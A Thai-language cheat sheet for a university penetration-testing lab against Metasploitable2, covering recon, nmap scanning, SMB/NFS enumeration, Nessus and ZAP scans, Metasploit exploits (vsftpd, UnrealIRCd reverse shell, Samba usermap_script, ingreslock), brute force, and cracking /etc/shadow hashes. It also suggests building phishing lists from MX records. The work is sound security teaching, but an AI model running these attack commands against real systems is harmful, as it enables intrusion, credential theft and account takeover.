Step 0 · เตรียมสนาม + กฎการเก็บหลักฐานL1 Lab
  1. เปิด Kali + Metasploitable2 บน VirtualBox/VMware → network mode Host-Only / Internal
  2. ip a — เช็ก Kali ได้ IP ในวง lab (เช่น 192.168.56.x)
  3. ping -c 4 <Target_IP> — ยืนยันคุยกันได้ ไม่มี packet loss
  4. เตรียมโฟลเดอร์เก็บผล: mkdir -p ~/Pentest_Labs/LabX + wordlist ด้วย nano user_list.txt

💡 กฎหลักฐาน: capture ทุกคำสั่ง+ผลลัพธ์ทุก step · ตั้งชื่อไฟล์ Section+Lab+รหัส เช่น S1L3_6604061234567.pdf — report คือของจริงของ pentester

💡 ping ไม่ตอบ ≠ เครื่องตาย — target อาจปิด ICMP ให้ไป scan ต่อได้เลย

Step 1 · Passive Recon (OSINT)ยิงไม่มี log — L2
  1. โดเมน: whois target.com → เจ้าของ/registrar/NS/dates
  2. DNS: nslookup -type=ns target.com, -type=mx, host -a target.com
  3. Zone transfer: dig @<IP> vulnerablelab.com AXFR (lab: เพิ่ม IP ใน /etc/hosts ก่อน)
  4. Dorking: site:target.com filetype:pdf, inurl:admin, intitle:"index of", ext:sql|log
  5. Email/subdomain: theHarvester -d kmutnb.ac.th -b yahoo (นับ emails/hosts)
  6. recon-ng: marketplace install hackertarget → modules load hackertarget → options set source vulnweb.com → run → show hosts
  7. Shodan web: filter port:,org:,country:TH,product:"Apache"

💡 AXFR สำเร็จ = ได้แผนที่ subdomain ทั้งเซิร์ฟ = ช่องโหว่ config ชั้นเยี่ยม (จดเป็น finding)

💡 MX record บอกผู้ให้บริการเมล → รู้ format อีเมล → ใช้ทำ phishing list / brute-force list

💡 dork ฝังใน exploit บน GHDB (exploit-db) — ค้นเวอร์ชันช่องโหว่ผ่านกูเกิ้ลได้

Step 2 · Scanning (Nmap)Active — L3
  1. หาเป้า: nmap -sn 192.168.56.0/24 → จด IP target
  2. Stealth top-1000: sudo nmap -sS <IP>
  3. เจาะจง: nmap -sT -p 21,80,445 <IP>
  4. เวอร์ชัน: nmap -sV <IP> → จด Apache/vsFTPd/OpenSSH+version
  5. OS: sudo nmap -O -T4 <IP>
  6. ครบชุด: sudo nmap -A <IP>
  7. ทุก port: nmap -p- <IP> / เร็วมาก: sudo masscan --ports 0-65535 <IP>
  8. เก็บไฟล์: -oN mscan.txt → cat mscan.txt · ทุก format -oA lab3_scan_results
  9. Full exercise: sudo nmap -sS -sV -sC -p- -T5 <IP> -o nmaplist.txt → ls/cat เทียบไม่ใส่ -sC

💡 -sS ต้อง sudo (สร้าง raw packet) · -sT ไม่ต้องแต่โดน log · เวอร์ชันที่ได้ = "ที่อยู่ของ CVE" ใน Step 4–5

💡 -T4/T5 เร็วแต่ดัง — ใน scope จริงใช้ T2-T3 กัน IDS; masscan เหมาะวงใหญ่ แล้วค่อย nmap เจาะรายตัว

💡 บันทึก output ทุกครั้ง (-oN/-oA) = หลักฐานใน report + ใช้ grep/XML ต่อได้

Step 3 · Enumerationลึกขึ้น — L4
  1. SMB version/share: nmap -sV -p 139,445 <IP> → smbclient -L \\<IP> (Enter = anonymous)
  2. Users/Groups/OS: enum4linux -a <IP> (ย่อย: -U users, -G groups, -S shares, -o OS)
  3. SMBMap สิทธิ์ share: smbmap -H <IP> (R/W ที่ไหนบ้าง)
  4. RPC/NFS: rpcinfo -p <IP> + showmount -e <IP>
  5. NetBIOS: nbtscan -v -s : 192.168.56.0/24 / nmap --script nbstat.nse -p137-139 <IP>
  6. Web path ซ่อน: nmap -p 80,443 --script http-enum <IP> → /phpMyAdmin/, /phpinfo.php
  7. Nikto: nikto -h <IP>
  8. User list NSE: nmap --script smb-enum-users.nse <IP> (+groups/-shares/-processes มี creds)

💡 showmount เห็น "/" = export ทั้ง root filesystem = finding หนักมาก จดไว้ยิงตอน exploit

💡 share ที่ write ได้ (เช่น /tmp) = จุดวาง payload/หลักฐาน — ทดสอบ: smbclient //<IP>/tmp → mkdir <studentID> → ls (นี่คือโจทย์ Lab!)

💡 enum4linux ได้ผลเมื่อ target อนุญาต anonymous (RestrictAnonymous=0) — Metasploitable2 เปิดไว้ให้ฝึก

Step 4 · Vulnerability Assessmentหา CVE + ให้คะแนน — L5
  1. อัปเดต scripts: sudo nmap --script-updatedb
  2. สแกน vuln ทั้งเครื่อง: nmap --script vuln <IP> → รอผล เจอ e.g. ftp-vsftpd-backdoor (CVE-2011-2523), ssl-poodle (CVE-2014-3566)
  3. FTP anonymous: nmap --script ftp-anon <IP>
  4. SSH auth: nmap --script ssh-auth-methods.nse <IP>

💡 เปลี่ยน script finding → CVE number → เช็ก CVSS band (Critical ≥9) → จัดลำดับตัวไหนยิงก่อน = หัวใจ VA

Nessus (host/network scanner)

  1. sudo dpkg -i Nessus-*.deb → sudo systemctl start nessusd
  2. Browser https://localhost:8834 → register Essentials (code ทาง email)
  3. New Scan → Basic Network Scan → name + targets (IP/range/subnet/domain)
  4. (optional Schedule) → Save → Launch
  5. จบแล้ว: แท็บ Vulnerabilities → filter CRITICAL/HIGH → อ่าน Description+Solution จด port/service

OWASP ZAP (webapp)

  1. sudo apt install zaproxy → เปิดโปรแกรม → Standard UI → Persist (.zap)
  2. Firefox proxy manual HTTP+SSL = 127.0.0.1:8080 ✓HTTPS
  3. ติดตั้ง CA: เข้า http://zap/ → download → import cert
  4. Browse http://<Target_IP>/ → คลิกขวา host → Attack → Active Scan (หรือ Quick Start Automated)
  5. ดู Alerts (RCE CVE-2012-1823, Path Traversal, Missing headers) → Report → HTML

💡 Nessus=มุมกว้างทั้ง host/network · ZAP=มุมลึกเฉพาะ web layer — Assignment p84 ให้เทียบสองตัวนี้ + ระบุ CRITICAL อยู่ port/service ไหน

💡 false positive เยอะ — ก่อนเขียน report ให้ยืนยัน manual (เช่น nmap -sV ซ้ำ / ลอง PoC ใน Step 5)

Step 5 · Exploitationยิงจริง — L6
Metasploit workflow 8 ขั้น (ใช้ซ้ำได้ทุกช่องโหว่)

msfconsole → search vsftpd|cve:xxxx → use exploit/… → show payloads → set PAYLOAD … → show options → set RHOSTS …(+LHOST ถ้า reverse) → exploit

  1. 21 vsftpd: use exploit/unix/ftp/vsftpd_234_backdoor → set RHOSTS → exploit → root! ตรวจ: id, uname -a, whoami
  2. Alt script: searchsploit vsftpd 2.3.4 → -m 49757 → python2 49757.py <IP>
  3. 22 SSH brute: nano meta.txt (user/pass pairs) → use auxiliary/scanner/ssh/ssh_login → RHOSTS + STOP_ON_SUCCESS true + USERPASS_FILE → exploit → sessions -i 1
  4. 23 Telnet: banner บอก msfadmin/msfadmin → telnet IP -l msfadmin → id/uname
  5. 25 SMTP: auxiliary/scanner/smtp/smtp_enum + THREADS → usernames (ยืนยัน nc VRFY)
  6. 6667 UnrealIRCd: exploit/unix/irc/unreal_ircd_3281_backdoor → PAYLOAD cmd/unix/reverse → set LHOST(Kali)+LPORT 4444 → exploit (target โทรกลับ)
  7. 5900 VNC: search vnc login → RHOSTS → exploit ('password')
  8. 139/445 Samba: nmap --script vulners เห็น 3.0.20 → smb_version ยืนยัน → searchsploit samba 3.0.20 → usermap_script (use 0) → exploit → root
  9. 1524 Ingreslock: nc -nv <IP> 1524 → root ทันที (ไม่ต้อง exploit!)
  10. 3632 DISTCC: service postgresql start ก่อน → payload bind_ruby → exploit
  11. 5432 Postgres: postgres_login + STOP_ON_SUCCESS true
  12. 2049 NFS: rpcinfo -p / showmount -e (ดู export)

💡 หลังได้ shell ทุกครั้ง: whoami → uname -a → ifconfig/ip a → ls สำรวจ = "ยืนยัน foothold" ใน report

💡 Reverse shell = target โทรกลับ LHOST (ผ่าน NAT/FW) · Bind = target เปิด port รอเราโทรเข้า — เลือก reverse เป็น default

💡 version ที่เจอใน Step 2–3 = ตัวชี้ว่าใช้ module ไหน — เจาะไม่ตรงเวอร์ชัน = crash เปล่า

Step 6 · Post-Exploitation → CrackL6→L7 สะพานสุดท้าย
  1. บน target (root): cat /etc/shadow → copy รายการ hash กลับ Kali → nano meta_shadow
  2. John: john --format=crypt meta_shadow / ใส่ wordlist --wordlist=/usr/share/wordlists/rockyou.txt → ดูผล john --show meta_shadow
  3. Hashcat: hashcat -m 500 -a 0 meta_shadow_cut rockyou.txt (-m500=md5crypt; $6$ ใช้ -m1800 sha512crypt)
  4. Online brute: hydra -L users.txt -P passwords.txt <IP> ftp (ssh/telnet เปลี่ยน service ท้ายคำ) → ยืนยัน login จริง
  5. WiFi: aircrack-ng -w rockyou.txt -b <MAC> cap*.cap
  6. Cleanup: ลบ account/artifact ที่ฝัง · จดทุก step เขียน report (Exec Summary/Findings/Risk/Recs)

💡 อ่าน prefix ทรู hash: $1$=MD5 · $2a$=bcrypt · $5$=SHA256 · $6$=SHA512 · $y$=yescrypt · ไม่มี=DES → เลือก -m ให้ถูก

💡 rockyou ต้องแตกก่อน: sudo gzip -d /usr/share/wordlists/rockyou.txt.gz · นับจำนวน wc -l

💡 Assignment p96: mkdir studentID ใน //IP/tmp จาก Kali + ยืนยัน ls -l ฝั่ง Metasploitable2 — พิสูจน์ write access = post-exploit evidence

จบเกม: Setup → Recon → Scan → Enumerate → VA → Exploit → Post/Crack — ทำตามสายพานนี้ทุกครั้ง = pentester ที่โจรต้องยอกล้อง 🎯
